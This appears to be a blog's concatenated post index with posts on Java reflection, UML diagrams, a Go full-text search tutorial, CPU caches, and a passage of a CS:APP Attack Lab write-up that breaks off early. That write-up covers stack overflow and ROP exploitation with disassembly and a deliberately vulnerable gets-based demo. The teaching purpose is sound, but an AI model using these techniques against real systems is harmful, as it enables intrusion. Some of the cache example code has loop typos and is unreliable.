通过构造方法中的Constructor的方法 创建对象 Object obj = con.newInstance(&quot;cuzz&quot;, 18, &quot;武汉&quot;); // 获取指定的方法 Method m4 = c.getMethod(&quot;method4&quot;, String.class); // 执行找到的方法 Object result = m4.invoke(obj, &quot;2018/03/19&quot;); System.out.println(&quot;result = &quot; + result); // result = 哈哈2018/03/19 }} 反射练习下面展示一下反射的利用场景。 泛型擦除思考，将已存在的ArrayList&lt;Integer&gt;集合中添加一个字符串数据，如何实现呢？ 我来告诉大家，其实程序编译后产生的.class文件中是没有泛型约束的，这种现象我们称为泛型的擦除。那么，我们可以通过反射技术，来完成向有泛型约束的集合中，添加任意类型的元素。 package cn.cuzz;import java.lang.reflect.Method;import java.util.ArrayList;public class Test7 { public static void main(String[] args) throws Exception, SecurityException { ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;(); // 添加元素 list.add(&quot;cuzz&quot;); // list.add(23); 报错 // 通过反射技术，实现添加任意类型的元素 // 获取字节码文件对象 Class c = Class.forName(&quot;java.util.ArrayList&quot;); // 找到add()方法 Method addMethod = c.getMethod(&quot;add&quot;, Object.class); // 执行add()方法 addMethod.invoke(list, 23); System.out.println(list); //[cuzz, 23] }} 反射配置文件通过配置文件得到类名和要运行的方法名,用反射的操作类名得到对象和调用方法 实现步骤: 准备配置文件,键值对 IO流读取配置文件 Reader 文件中的键值对存储到集合中 Properties集合保存的键值对,就是类名和方法名 反射获取指定类的class文件对象 class文件对象,获取指定的方法 运行方法 public class Test8 { public static void main(String[] args) throws Exception{ // IO流读取配置文件 FileReader r = new FileReader(&quot;config.properties&quot;); // 创建集合对象 Properties pro = new Properties(); // 调用集合方法load,传递流对象 pro.load(r); r.close(); // 通过键获取值 String className = pro.getProperty(&quot;className&quot;); String methodName = pro.getProperty(&quot;methodName&quot;); // 反射获取指定类的class文件对象 Class c = Class.forName(className); Object obj = c.newInstance(); // 获取指定的方法名 Method method = c.getMethod(methodName); method.invoke(obj); }} 配置文件 # className=cn.cuzz.Student# methodName=studyclassName=cn.cuzz.TeachermethodName=teach# className=cn.cuzz.Worker# methodName=work","link":"/2019/02/11/Java%E5%8F%8D%E5%B0%84/"},{"title":"Markdown绘制UML图","text":"makedown 用户 -&gt; 认证中心: 登录操作认证中心 -&gt; 缓存: 存放(key=token+ip,value=token)token认证中心 -&gt; 用户: 认证成功返回token用户 -&gt; 认证中心: 下次访问头部携带token认证缓存 -&gt; 认证中心: key=token+ip获取token认证中心-&gt;其他服务: 存在且校验成功则跳转到用户请求的其他服务其他服务 -&gt; 用户: 信息 测试 @startuml用户 -&gt; 认证中心: 登录操作认证中心 -&gt; 缓存: 存放(key=token+ip,value=token)token 用户 &lt;- 认证中心 : 认证成功返回token用户 -&gt; 认证中心: 下次访问头部携带token认证认证中心 &lt;- 缓存: key=token+ip获取token其他服务 &lt;- 认证中心: 存在且校验成功则跳转到用户请求的其他服务其他服务 -&gt; 用户: 信息@enduml @startuml用户 -&gt; 认证中心: 登录操作认证中心 -&gt; 缓存: 存放(key=token+ip,value=token)token用户 &lt;- 认证中心 : 认证成功返回token用户 -&gt; 认证中心: 下次访问头部携带token认证认证中心 &lt;- 缓存: key=token+ip获取token其他服务 &lt;- 认证中心: 存在且校验成功则跳转到用户请求的其他服务其他服务 -&gt; 用户: 信息@enduml","link":"/2000/05/10/Markdown%E7%BB%98%E5%88%B6UML%E5%9B%BE/"},{"title":"Let&#39;s build a Full-Text Search engine","text":"这是一篇转载文章原文地址，原文讲述如何构建一个全文搜索引擎，用的 Go 实现的，本来想翻译一下，顺便用 Java 实现一下，由于翻译出来比较生硬，还是把原文放出来，顺便把我用 Java 实现的版本放在链接中Java实现版本。 Full-Text Search is one of those tools people use every day without realizing it. If you ever googled “golang coverage report” or tried to find “indoor wireless camera” on an e-commerce website, you used some kind of full-text search. Full-Text Search (FTS) is a technique for searching text in a collection of documents. A document can refer to a web page, a newspaper article, an email message, or any structured text. Today we are going to build our own FTS engine. By the end of this post, we’ll be able to search across millions of documents in less than a millisecond. We’ll start with simple search queries like “give me all documents that contain the word cat“ and we’ll extend the engine to support more sophisticated boolean queries. Note Most well-known FTS engine is Lucene (as well as Elasticsearch and Solr built on top of it). Why FTSBefore we start writing code, you may ask “can’t we just use grep or have a loop that checks if every document contains the word I’m looking for?“. Yes, we can. However, it’s not always the best idea. CorpusWe are going to search a part of the abstract of English Wikipedia. The latest dump is available at dumps.wikimedia.org. As of today, the file size after decompression is 913 MB. The XML file contains over 600K documents. Document example: &lt;title&gt;Wikipedia: Kit-Cat Klock&lt;/title&gt;&lt;url&gt;https://en.wikipedia.org/wiki/Kit-Cat_Klock&lt;/url&gt;&lt;abstract&gt;The Kit-Cat Klock is an art deco novelty wall clock shaped like a grinning cat with cartoon eyes that swivel in time with its pendulum tail.&lt;/abstract&gt; Loading documentsFirst, we need to load all the documents from the dump. The built-in encoding/xml package comes very handy: import ( &quot;encoding/xml&quot; &quot;os&quot;)type document struct { Title string `xml:&quot;title&quot;` URL string `xml:&quot;url&quot;` Text string `xml:&quot;abstract&quot;` ID int}func loadDocuments(path string) ([]document, error) { f, err := os.Open(path) if err != nil { return nil, err } defer f.Close() dec := xml.NewDecoder(f) dump := struct { Documents []document `xml:&quot;doc&quot;` }{} if err := dec.Decode(&amp;dump); err != nil { return nil, err } docs := dump.Documents for i := range docs { docs[i].ID = i } return docs, nil} Every loaded document gets assigned a unique identifier. To keep things simple, the first loaded document gets assigned ID=0, the second ID=1 and so on. First attemptSearching the contentNow that we have all documents loaded into memory, we can try to find the ones about cats. At first, let’s loop through all documents and check if they contain the substring cat: func search(docs []document, term string) []document { var r []document for _, doc := range docs { if strings.Contains(doc.Text, term) { r = append(r, doc) } } return r} On my laptop, the search phase takes 103ms - not too bad. If you spot check a few documents from the output, you may notice that the function matches caterpillar and category, but doesn’t match Cat with the capital C. That’s not quite what I was looking for. We need to fix two things before moving forward: Make the search case-insensitive (so Cat matches as well). Match on a word boundary rather than on a substring (so caterpillar and communication don’t match). Searching with regular expressionsOne solution that quickly comes to mind and allows implementing both requirements is regular expressions. Here it is - (?i)\\bcat\\b: (?i) makes the regex case-insensitive \\b matches a word boundary (position where one side is a word character and another side is not a word character) func search(docs []document, term string) []document { re := regexp.MustCompile(`(?i)\\b` + term + `\\b`) // Don't do this in production, it's a security risk. term needs to be sanitized. var r []document for _, doc := range docs { if re.MatchString(doc.Text) { r = append(r, doc) } } return r} Ugh, the search took more than 2 seconds. As you can see, things started getting slow even with 600K documents. While the approach is easy to implement, it doesn’t scale well. As the dataset grows larger, we need to scan more and more documents. The time complexity of this algorithm is linear - the number of documents required to scan is equal to the total number of documents. If we had 6M documents instead of 600K, the search would take 20 seconds. We need to do better than that. Inverted IndexTo make search queries faster, we’ll preprocess the text and build an index in advance. The core of FTS is a data structure called Inverted Index. The Inverted Index associates every word in documents with documents that contain the word. Example: documents = { 1: &quot;a donut on a glass plate&quot;, 2: &quot;only the donut&quot;, 3: &quot;listen to the drum machine&quot;,}index = { &quot;a&quot;: [1], &quot;donut&quot;: [1, 2], &quot;on&quot;: [1], &quot;glass&quot;: [1], &quot;plate&quot;: [1], &quot;only&quot;: [2], &quot;the&quot;: [2, 3], &quot;listen&quot;: [3], &quot;to&quot;: [3], &quot;drum&quot;: [3], &quot;machine&quot;: [3],} Below is a real-world example of the Inverted Index. An index in a book where a term references a page number: Text analysisBefore we start building the index, we need to break the raw text down into a list of words (tokens) suitable for indexing and searching. The text analyzer consists of a tokenizer and multiple filters. TokenizerThe tokenizer is the first step of text analysis. Its job is to convert text into a list of tokens. Our implementation splits the text on a word boundary and removes punctuation marks: func tokenize(text string) []string { return strings.FieldsFunc(text, func(r rune) bool { // Split on any character that is not a letter or a number. return !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r) })} &gt; tokenize(&quot;A donut on a glass plate. Only the donuts.&quot;)[&quot;A&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;Only&quot;, &quot;the&quot;, &quot;donuts&quot;] FiltersIn most cases, just converting text into a list of tokens is not enough. To make the text easier to index and search, we’ll need to do additional normalization. LowercaseIn order to make the search case-insensitive, the lowercase filter converts tokens to lower case. cAt, Cat and caT are normalized to cat. Later, when we query the index, we’ll lower case the search terms as well. This will make the search term cAt match the text Cat. func lowercaseFilter(tokens []string) []string { r := make([]string, len(tokens)) for i, token := range tokens { r[i] = strings.ToLower(token) } return r} &gt; lowercaseFilter([]string{&quot;A&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;Only&quot;, &quot;the&quot;, &quot;donuts&quot;})[&quot;a&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;the&quot;, &quot;donuts&quot;] Dropping common wordsAlmost any English text contains commonly used words like a, I, the or be. Such words are called stop words. We are going to remove them since almost any document would match the stop words. There is no “official” list of stop words. Let’s exclude the top 10 by the OEC rank. Feel free to add more: var stopwords = map[string]struct{}{ // I wish Go had built-in sets. &quot;a&quot;: {}, &quot;and&quot;: {}, &quot;be&quot;: {}, &quot;have&quot;: {}, &quot;i&quot;: {}, &quot;in&quot;: {}, &quot;of&quot;: {}, &quot;that&quot;: {}, &quot;the&quot;: {}, &quot;to&quot;: {},}func stopwordFilter(tokens []string) []string { r := make([]string, 0, len(tokens)) for _, token := range tokens { if _, ok := stopwords[token]; !ok { r = append(r, token) } } return r} &gt; stopwordFilter([]string{&quot;a&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;the&quot;, &quot;donuts&quot;})[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donuts&quot;] StemmingBecause of the grammar rules, documents may include different forms of the same word. Stemming reduces words into their base form. For example, fishing, fished and fisher may be reduced to the base form (stem) fish. Implementing a stemmer is a non-trivial task, it’s not covered in this post. We’ll take one of the existing modules: import snowballeng &quot;github.com/kljensen/snowball/english&quot;func stemmerFilter(tokens []string) []string { r := make([]string, len(tokens)) for i, token := range tokens { r[i] = snowballeng.Stem(token, false) } return r} &gt; stemmerFilter([]string{&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donuts&quot;})[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donut&quot;] Note A stem is not always a valid word. For example, some stemmers may reduce airline to airlin. Putting the analyzer togetherfunc analyze(text string) []string { tokens := tokenize(text) tokens = lowercaseFilter(tokens) tokens = stopwordFilter(tokens) tokens = stemmerFilter(tokens) return tokens} The tokenizer and filters convert sentences into a list of tokens: &gt; analyze(&quot;A donut on a glass plate. Only the donuts.&quot;)[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donut&quot;] The tokens are ready for indexing. Building the indexBack to the inverted index. It maps every word in documents to document IDs. The built-in map is a good candidate for storing the mapping. The key in the map is a token (string) and the value is a list of document IDs: type index map[string][]int Building the index consists of analyzing the documents and adding their IDs to the map: func (idx index) add(docs []document) { for _, doc := range docs { for _, token := range analyze(doc.Text) { ids := idx[token] if ids != nil &amp;&amp; ids[len(ids)-1] == doc.ID { // Don't add same ID twice. continue } idx[token] = append(ids, doc.ID) } }}func main() { idx := make(index) idx.add([]document{{ID: 1, Text: &quot;A donut on a glass plate. Only the donuts.&quot;}}) idx.add([]document{{ID: 2, Text: &quot;donut is a donut&quot;}}) fmt.Println(idx)} It works! Each token in the map refers to IDs of the documents that contain the token: map[donut:[1 2] glass:[1] is:[2] on:[1] only:[1] plate:[1]] QueryingTo query the index, we are going to apply the same tokenizer and filters we used for indexing: func (idx index) search(text string) [][]int { var r [][]int for _, token := range analyze(text) { if ids, ok := idx[token]; ok { r = append(r, ids) } } return r} &gt; idx.search(&quot;Small wild cat&quot;)[[24, 173, 303, ...], [98, 173, 765, ...], [[24, 51, 173, ...]] And finally, we can find all documents that mention cats. Searching 600K documents took less than a millisecond (18µs)! With the inverted index, the time complexity of the search query is linear to the number of search tokens. In the example query above, other than analyzing the input text, search had to perform only three map lookups. Boolean queriesThe query from the previous section returned a disjoined list of documents for each token. What we normally expect to find when we type small wild cat in a search box is a list of results that contain small, wild and cat at the same time. The next step is to compute the set intersection between the lists. This way we’ll get a list of documents matching all tokens. Luckily, IDs in our inverted index are inserted in ascending order. Since the IDs are sorted, it’s possible to compute the intersection between two lists in linear time. The intersection function iterates two lists simultaneously and collect IDs that exist in both: func intersection(a []int, b []int) []int { maxLen := len(a) if len(b) &gt; maxLen { maxLen = len(b) } r := make([]int, 0, maxLen) var i, j int for i &lt; len(a) &amp;&amp; j &lt; len(b) { if a[i] &lt; b[j] { i++ } else if a[i] &gt; b[j] { j++ } else { r = append(r, a[i]) i++ j++ } } return r} Updated search analyzes the given query text, lookups tokens and computes the set intersection between lists of IDs: func (idx index) search(text string) []int { var r []int for _, token := range analyze(text) { if ids, ok := idx[token]; ok { if r == nil { r = ids } else { r = intersection(r, ids) } } else { // Token doesn't exist. return nil } } return r} The Wikipedia dump contains only two documents that match small, wild and cat at the same time: &gt; idx.search(&quot;Small wild cat&quot;)130764 The wildcat is a species complex comprising two small wild cat species, the European wildcat (Felis silvestris) and the African wildcat (F. lybica).131692 Catopuma is a genus containing two Asian small wild cat species, the Asian golden cat (C. temminckii) and the bay cat. The search is working as expected! By the way, this is the first time I hear about catopuma, here is one of them: ConclusionsWe just built a Full-Text Search engine. Despite its simplicity, it can be a solid foundation for more advanced projects. I didn’t touch on a lot of things that can significantly improve the performance and make the engine more user friendly. Here are some ideas for further improvements: Extend boolean queries to support OR and NOT. Store the index on disk: Rebuilding the index on every application restart may take a while. Large indexes may not fit in memory. Experiment with memory and CPU-efficient data formats for storing sets of document IDs. Take a look at Roaring Bitmaps. Support indexing multiple document fields. Sort results by relevance. The full source code is available on GitHub. I’m not a native English speaker and I’m trying to improve my language skills. Feel free to correct me if you spot any spelling or grammatical error!","link":"/2020/08/17/Let's_build_a_Full-Text_Search_engine/"},{"title":"深入理解高速缓存工作原理","text":"为什么需要高速缓存早期 CPU 相比现在的 CPU 比较简单，没有 Cache 的计算机系统的简化模型，CPU在执行时需要的指令和数据通过内存总线和系统总线由内存传送到寄存器，再由寄存器送入ALU）。 那时候，CPU 内核的频率与内存总线的频率相当。内存访问只比寄存器访问慢一点。随着 CPU 内核频率不断增加，内存总线的频率和 RAM 芯片的性能并没有成比例增加。 下图展示了CPU和主存（DRAM）、磁盘速度上的差距。可以看到，CPU的速度大概是主存的几十倍，如果没有Cache（SRAM），这就出现了 CPU 等待 I/O 访存的现象，致使CPU空等一段时间，甚至可能等待几个主存周期，从而降低了CPU 的工作效率。 在 CUP 和 DRAM 之间引入高速 SRAM，来弥补这种差距，当 CPU 需要数据时，先查 SRAM（Cache）中，如果在 Cache 中可以查询到，叫作缓存命中，则就不需要访问 DRAM 了，节约时间。 程序局部性原理为了充分发挥 Cache 的能力，使得机器的速度能够切实的得到提高，必须要保障 CPU 访问的指令或数据大多情况下都能够在 Cache 中找到，这样依靠程序访问的局部性原理。 时间局部性：最近访问的数据可能在不久的将来会再次访问 空间局部性：位置相近的数据常常在相近的时间内被访问 存储山由于不同的存储技术在存储速度和造价上相差巨大，为了高效的访问数据，现代计算机的存储系统会把最常用的数据放在读存速度快的存储设备上，而把不常用的数据放在读存速度慢的存储设备上。 存储器系统是一个具有不同容量、成本和访问时间的存储设备的层级结构。从上往下容量越来越大，但访问速度越来越慢。上一层做为下一层的缓存来存储访问频率更高的数据， 比如，CPU 寄存器保存着最常用的数据。靠近 CPU 的小的、快速的高速缓存存储器是内存上一部分数据和指令的缓冲区域。主存缓存磁盘上的数据，而这些磁盘又常常作为存储在通过网络连接的其他机器的磁盘或磁带上的数据的缓冲区域。存储层次如下： 高速缓存原理假设计算机储存地址为 m 位，形成 M = 2^m 个不同的地址，就会形成 S = 2^s 个缓存组（cache set），每组包含 E 个高速缓存行（cache line），每行包含一个有效位（valid bit）指明这个行是否有效，t 个标记位（tag bit）和 B = 2^b 个缓存数据块。 Cache由硬件管理，硬件在得到内存地址后会将地址划分为三个部分 首先根据组下标选择一个组，然后将地址中的标签与被选中组的每个行中的标签进行比较，如果标签相等，且有效位为1，则 Cache 命中，再根据块偏移从行中选出相应的数据。 假设计算机储存地址为 m 位，形成 M = 2^m 个不同的地址，就会形成 S = 2^s 个缓存组（cache set），每组包含 E 个高速缓存行（cache line），每行包含一个有效位（valid bit）指明这个行是否有效，t 个标记位（tag bit）和 B = 2^b 个缓存数据块 假设 m = 4，t = 2，s = 1，b = 1，E = 2 可知： M = 2^m = 2^4 = 16 S = 2^s = 2^1 = 2 B = 2^b = 2^1 = 2 分别读取地址为 0、1、7、8、0 这几个地址，看看缓存能命中哪些？ 具体过程如图： 高速缓存不命中替换 如果 CPU 请求的数据不在任何一行中，那么缓存不命中，如果有空行的话就把数据缓存到空行中，如果没有空行，那我们必须选择一个非空行替换。可以使用 LRU 算法来替换。 为什么使用中间位来做索引？假设我们有一个缓存组可以缓存四块，如果我们去 0000 这块数据，并且把 0001、0002 和 0003 这三块数据加入缓存中，就会发现，使用高位缓存只能缓存一块数据，而使用中间位来索引可以缓存四块数据。所以使用高位做缓存缓存的使用效率很低。 高速缓存读与写高速缓存读 首先，在高速缓存中查找所需字 w 的副本。如果命中，立即返回字 w 给CPU。如果不命中，从存储器层次结构中较低层中取出包含字 w 的块，将这个块存储到某个高速缓存行中，然后返回字 w。 高速缓存写 写命中 直写（write-through），写一个已经缓存了的字w（写命中，write hit），立即将w的高速缓存块写回到紧接着的低一层中。 写回（write-back），尽可能的推迟更新，只有当替换算法要驱逐这个更新过的块时，才把写到紧接着的低一层中。高速缓存必须为每一个高速缓存行维护一个额外的修改位（dirty bit），表明这个高速缓存块是否被修改过。 写不命中 写分配（write-allocate），加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。 非写分配（not-write-allocate），避开高速缓存，直接把这个字写到低一层中。 Cache 失效的三种原因 Cold miss：刚刚使用Cache时Cache为空，此时必然发生Cache miss。 Capacity miss：程序最经常使用的那些数据(工作集,working set)超过了Cache的大小 Conflict miss：Cache容量足够大，但是不同的数据映射到了同一组，从而造成Cache line反复被替换的现象。 高速缓存结构我们看看 Intel Core i7 处理器的高速缓存层次结构。每个 CPU 芯片有四个核。每个核有自己的 L1 i-cache（指令高速缓存）、L1 d-cache（数据高速缓存）、和 L2 统一高速缓存。以及 L3 为所有核共享高速缓存。所有的缓存都是集成在 CPU 芯片上。 下面指标高速缓存类型（Cache Type）、访问周期（Access time）、缓存大小（Cache size）、一组有多少行（Assoc）、块大小（Block size）以及组数（Set）。 编写高速缓存友好代码假设我们需要来计算一个二维数组的和，有两种方式分别是按行计算和按列计算。 假设我们高速缓存为 4 字，可以缓存 4 和 int 的值。 按行计算 int sumarrrayrows(int a[M][N]) { int i, j, sum = 0; for (i = 0; i &lt; M; i++) { for (j = 0; i &lt; N; j++) { sum += a[i][j]; } } return sum;} 当我们加载地址为1的数，会把 2、3和4地址的数据加载到高速缓存中，如果是按行，后面这几个就会缓存命中。 具体缓存命中情况如图： 按列计算 int sumarrraycols(int a[M][N]) { int i, j, sum = 0; for (j = 0; i &lt; N; j++) { for (i = 0; i &lt; M; i++) { sum += a[i][j]; } } return sum;} 当我们加载地址为1的数，会把 2、3和4地址的数据加载到高速缓存中，然而我们下个取得是 5 所以缓存不命中，同时会把 6、7和8地址加到缓存中。接着下个取地址为9的值，缓存又不命中。 具体缓存情况如图： 我们看上去只是调换了一下顺序，缓存命中相差很大，所以编写高速缓存友好代码。 总结学习到了高速缓存原理，以及编写高速缓存友好代码。 参考 深入理解计算机系统 深入理解处理器高速缓存的工作机制 Linux内存系列2 - CPU Cache 计算机组成原理（2）-cache高速缓存存储器","link":"/2020/11/28/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"},{"title":"Attack Lab","text":"介绍主要分为两种不同类型的攻击： Buffer overflow attacks ROP attacks 大概介绍下每个文件的作用： ctarget: 用来做代码注入攻击的程序 rtarget: 用来做 ROP 攻击的程序 cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符 farm.c: 用来找寻 gadget 的源文件 hex2raw: 用来生成攻击字符串的程序 有几点需要注意： 输入的字符串中不能有 0x0a，因为这是 \\n 的意思，遇到这个的话会提前结束输入 hex2raw 每次需要输入一个 2 位的 16 进制编码，如果想要输出 0，那么需要写 00。想要转换 0xdeadbeef，需要传入 ef be ad de，因为是 little-endian 规则 通过完成本实验达到： 深入理解当程序没有对缓冲区溢出做足够防范时，攻击者可能会如何利用这些安全漏洞。 深入理解x86-64机器代码的栈和参数传递机制。 深入理解x86-64指令的编码方式。 熟练使用 gdb 和 objdump 等调试工具。 更好地理解写出安全的程序的重要性，了解到一些编译器和操作系统提供的帮助改善程序安全性的特性。 背景知识缓冲区溢出我们通过一个一个例子来观察： #include&lt;stdio.h&gt;typedef struct { int a[2]; double d;} struct_t;double fun(int i) { volatile struct_t s; s.d = 3.14; s.a[i] = 1073741824; /* Possibly out of bounds */ return s.d;}int main() { int i = 0; double d = 0.0; while(1) { scanf(&quot;%d&quot;, &amp;i); d = fun(i); printf(&quot;fun(%d) -&gt; %.10f \\n&quot;,i, d); }} 输出结果： fun(0) -&gt; 3.1400000000fun(1) -&gt; 3.1400000000fun(2) -&gt; 3.1399998665fun(3) -&gt; 2.0000006104fun(4) -&gt; 3.1400000000fun(5) -&gt; 3.1400000000fun(6) -&gt; segmentation fault 具体内存中 6 其他特殊字节 f(6)改变了栈中的关键信息，报错5 其他特殊字节 f(5)改变了栈中的非关键信息，不影响4 其他特殊字节 f(4)改变了栈中的非关键信息，不影响3 d中高4字节 f(3)改变了d中的高4字节2 d中低4字节 f(2)改变了d中的低4字节1 a[1] f(1)改变不影响0 a[0] f(0)改变不影响 在 Unix 标准库中的 gets 函数也会出现缓存溢出，随着用户不断输入，缓存区可以不够。 char *gets(char *dest) { int c = getchar(); char *p = dest; while (c != EOF &amp;&amp; c != '\\n') { *p++ = c; c = getchar(); } *p = '\\0'; return dest; } 由于C语言中对数组引用不做任何边界检查，而且局部变量和状态信息（例如保存的寄存器值和返回地址）都存放在栈中，所以对越界的数组元素的写操作会破坏存储在栈中的状态信息，可能会产生严重的后果。 栈溢出攻击栈溢出（stack-based buffer overflows）算是安全界常见的漏洞。一方面因为程序员的疏忽，使用了 strcpy、sprintf 等不安全的函数，增加了栈溢出漏洞的可能。另一方面，因为栈上保存了函数的返回地址等信息，因此如果攻击者能任意覆盖栈上的数据，通常情况下就意味着他能修改程序的执行流程，从而造成更大的破坏。这种攻击方法就是栈溢出攻击（stack smashing attacks） #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* target code */void smash(){ printf(&quot;I've been smashed!\\n&quot;); exit(0);}/* Implementation of library function gets() */char *gets(char *s){ int c; char *dest = s; while((c = getchar()) != '\\n' &amp;&amp; c != EOF) *dest++ = c; if(c == EOF &amp;&amp; dest == s) /* No characters read */ return NULL; *dest++ = '\\0'; /* Terminate string */ return s;}/** Read input line and write it back */void echo(){ char buf[4]; gets(buf); puts(buf);}int main(int argc, char* argv[]){ echo(); return 0;} 使用如下命令编译： gcc -fno-asynchronous-unwind-tables -fno-stack-protector -O1 echo.c -o echo -fno-asynchronous-unwind-tables :不生成CFI指令 -fno-stack-protector :阻止进行栈破坏检测，默认是允许使用栈保护者 -O1:不做任何优化处理 使用objdump反汇编得到如下结果： 000000000000073a &lt;smash&gt;: 73a: 48 83 ec 08 sub $0x8,%rsp 73e: 48 8d 3d 1f 01 00 00 lea 0x11f(%rip),%rdi # 864 &lt;_IO_stdin_used+0x4&gt; 745: e8 a6 fe ff ff callq 5f0 &lt;puts@plt&gt; 74a: bf 00 00 00 00 mov $0x0,%edi 74f: e8 bc fe ff ff callq 610 &lt;exit@plt&gt;000000000000079d &lt;echo&gt;: 79d: 53 push %rbx 79e: 48 83 ec 10 sub $0x10,%rsp 7a2: 48 8d 5c 24 0c lea 0xc(%rsp),%rbx 7a7: 48 89 df mov %rbx,%rdi 7aa: e8 a5 ff ff ff callq 754 &lt;gets&gt; 7af: 48 89 df mov %rbx,%rdi 7b2: e8 39 fe ff ff callq 5f0 &lt;puts@plt&gt; 7b7: 48 83 c4 10 add $0x10,%rsp 7bb: 5b pop %rbx 7bc: c3 retq 00000000000007bd &lt;main&gt;: 7bd: 48 83 ec 08 sub $0x8,%rsp 7c1: b8 00 00 00 00 mov $0x0,%eax 7c6: e8 d2 ff ff ff callq 79d &lt;echo&gt; 7cb: b8 00 00 00 00 mov $0x0,%eax # 调用echo之后返回这里 7d0: 48 83 c4 08 add $0x8,%rsp 7d4: c3 retq 7d5: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 7dc: 00 00 00 7df: 90 nop 具体的执行到 echo 函数的栈帧，当我们输入超过 23 个字符（加上\\0 一共24个），就会影响到返回地址。如果最后地址为00000000 0000073a 就能转到 smash 方法。 代码注入攻击Code Injection Attacks（代码注入攻击）是指输入的字符串中包含exploit code的字节表示，将返回地址改成exploit code的首地址，这样在ret时将会跳转到exploit code处执行。 ROP 攻击缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。 （1）栈随机化 栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。 （2）栈破坏检测 最近的GCC版本在产生的代码加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。 （3）限制可执行代码区域 最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。 ROP全称为Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。 在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以ret结尾，这一段指令序列，我们称之为gadget。 每一段gadget包含一系列指令字节，而且以ret结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码，对程序造成攻击。 示例 void setval_210(unsigned *p){ *p = 3347663060U;} 对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列: 0000000000400f15 &lt;setval_210&gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 其中，字节序列48 89 c7是对指令movq %rax, %rdi的编码，这就是一个 gadget，就这样我们可以利用已经存在的程序，从中提取出特定的指令，执行特定的功能，地址为0x400f18，其功能是将%rax的内容移到%rdi。 下面是指令参考表： 防止栈溢出攻击方法 避免使用gets等存在安全隐患的库函数 操作系统层面：栈随机偏移。在每次程序执行之初，在栈上申请一段随机大小的空间使整个栈移动一段距离，这样可以防止黑客预测exploit code开始的地址 操作系统层面：将栈设置为不可执行(Nonexecutable)，这样执行exploit code时会报错 金丝雀(canary)机制。在buffer之外放置一个特殊的保护值(canary)，在函数执行完返回之前检查保护值是否被更改，如果被更改则检测到stack smashing。 实验部分阶段一这个需要我们在执行 test ，可以调用另外方法，进行劫持程序。在这个阶段中，我们的任务是在test函数执行完getbuf后返回到touch1函数。 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch1(){ vlevel = 1; /* Part of validation protocol */ printf(&quot;Touch1!: You called touch1()\\n&quot;); validate(1); exit(0);} 思路： 找到getbuf函数在栈上为输入字符串分配的缓冲区大小 找到touch1函数的首地址 构造 exploit code，将缓冲区填满，并在随后的8个字节(返回地址)上填写touch1函数的首地址 查看 getbuf 缓冲区大小，sub $0x28,%rsp，可以知道在栈上分配了 40 字节大小。 (gdb) disas getbufDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retqEnd of assembler dump. 找到 touch1 的首地址，为 0x004017c0 (gdb) disas touch1Dump of assembler code for function touch1: 0x00000000004017c0 &lt;+0&gt;: sub $0x8,%rsp 0x00000000004017c4 &lt;+4&gt;: movl $0x1,0x202d0e(%rip) # 0x6044dc &lt;vlevel&gt; 0x00000000004017ce &lt;+14&gt;: mov $0x4030c5,%edi 0x00000000004017d3 &lt;+19&gt;: callq 0x400cc0 &lt;puts@plt&gt; 0x00000000004017d8 &lt;+24&gt;: mov $0x1,%edi 0x00000000004017dd &lt;+29&gt;: callq 0x401c8d &lt;validate&gt; 0x00000000004017e2 &lt;+34&gt;: mov $0x0,%edi 0x00000000004017e7 &lt;+39&gt;: callq 0x400e40 &lt;exit@plt&gt;End of assembler dump. 前 40 